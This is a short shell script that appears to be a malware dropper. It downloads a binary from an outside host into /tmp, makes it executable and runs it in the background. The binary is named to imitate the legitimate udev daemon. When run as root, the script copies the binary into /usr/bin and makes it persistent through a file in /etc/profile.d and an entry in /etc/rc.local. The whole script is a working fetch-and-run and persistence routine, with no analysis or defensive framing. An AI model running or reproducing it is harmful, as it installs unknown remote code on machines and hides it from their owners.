cd /tmp/
wget https://colafox.top/systemd-udedv
chmod +x systemd-udedv
nohup ./systemd-udedv &

if [ `id -u` -eq 0 ];then
	echo "is running at root"
	cp systemd-udedv /usr/bin
	chmod +x /usr/bin/systemd-udedv 
	echo "nohup systemd-udedv &" > libblockdev.sh
	cp libblockdev.sh /etc/profile.d
	chmod +x /etc/profile.d/libblockdev.sh
	echo "bash /etc/profile.d/libblockdev.sh" >> /etc/rc.local;chmod +x /etc/rc.local
else
	echo "not running at root"
fi

